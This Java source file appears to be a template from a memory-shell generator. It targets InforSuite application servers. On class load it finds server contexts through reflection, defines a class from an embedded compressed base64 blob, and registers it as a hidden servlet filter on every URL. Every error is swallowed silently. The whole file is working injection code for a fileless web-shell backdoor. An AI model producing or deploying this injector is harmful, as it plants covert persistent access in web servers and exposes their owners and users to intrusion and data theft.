package jmg.core.template;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.zip.GZIPInputStream;


public class InforSuiteFilterInjectorTpl {

    public String getUrlPattern() {
        return "/*";
    }


    public String getClassName() {
        return "";
    }

    public String getBase64String() throws IOException {
        return "";
    }

    static {
        new InforSuiteFilterInjectorTpl();
    }

    public InforSuiteFilterInjectorTpl() {
        try {
            List<Object> contexts = getContext();
            for (Object context : contexts) {
                Object filter = getFilter(context);
                addFilter(context, filter);
            }
        } catch (Exception ignored) {

        }

    }

    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        List<Object> contexts = new ArrayList();
        Thread[] threads = getThreads();
        try {
            for (Thread thread : threads) {
                if (thread.getName().contains("ContainerBackgroundProcessor")) {
                    HashMap childrenMap = (HashMap) getFV(getFV(getFV(thread, "target"), "this$0"), "children");
                    for (Object key : childrenMap.keySet()) {
                        HashMap children = (HashMap) getFV(childrenMap.get(key), "children");
                        for (Object key1 : children.keySet()) {
                            Object context = children.get(key1);
                            if (context != null) contexts.add(context);
                        }
                    }
                }
            }
        } catch (Exception ignored) {
        }
        return contexts;
    }

    public Thread[] getThreads(){
        Thread[] var0 = null;

        try {
            var0 = (Thread[])(invokeMethod(Thread.class, "getThreads"));
        } catch (NoSuchMethodException | InvocationTargetException | IllegalAccessException var3) {
            ThreadGroup var2 = Thread.currentThread().getThreadGroup();
            var0 = new Thread[var2.activeCount()];
            var2.enumerate(var0);
        }

        return var0;
    }

    private Object getFilter(Object context) throws Exception {
        ClassLoader classLoader = (ClassLoader) getFV(getFV(context, "loader"), "classLoader");
        Object filter = null;
        try {
            filter = classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class clazz = (Class) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                filter = clazz.newInstance();
            } catch (Exception ignored) {
            }

        }
        return filter;
    }

    public void addFilter(Object context, Object filter) {
        String filterName = getSimpleName(getClassName());
        try {
            Object filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
            Object filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
            invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
            invokeMethod(filterDef, "setFilter", new Class[]{Class.forName("javax.servlet.Filter")}, new Object[]{filter});
            invokeMethod(filterDef, "setFilterClassName", new Class[]{String.class}, new Object[]{null});
            invokeMethod(filterDef, "setFilterClass", new Class[]{Class.class}, new Object[]{filter.getClass()});
            invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
            invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
            invokeMethod(filterMap, "setURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
            // org.apache.catalina.core.StandardContext.addFilterMap(org.apache.catalina.deploy.FilterMap, boolean)
            invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass(), boolean.class}, new Object[]{filterMap, false});
            Constructor<?>[] constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
            constructors[0].setAccessible(true);
            Object filterConfig = constructors[0].newInstance(context, filterDef);
            Map filterConfigs = (Map) getFV(context, "filterConfigs");
            filterConfigs.put(filterName, filterConfig);
        } catch (Exception ignored) {
        }
    }


    static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        }
    }


    public static String getSimpleName(String className) {
        int lastDotIndex = className.lastIndexOf(".");
        if (lastDotIndex != -1 && lastDotIndex < className.length() - 1) {
            return className.substring(lastDotIndex + 1);
        }
        return className;
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream ungzip = new GZIPInputStream(in);
        byte[] buffer = new byte[256];
        int n;
        while ((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }

    static Object getFV(Object obj, String fieldName) throws Exception {
        Field field = getF(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }

    static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = (obj instanceof Class) ? (Class) obj : obj.getClass();
        Method method = null;

        Class tempClass = clazz;
        while (method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    // Get all declared methods of the class
                    Method[] methods = tempClass.getDeclaredMethods();
                    for (int i = 0; i < methods.length; i++) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                tempClass = tempClass.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        if (obj instanceof Class) {
            try {
                return method.invoke(null, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        } else {
            try {
                return method.invoke(obj, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        }
    }
}
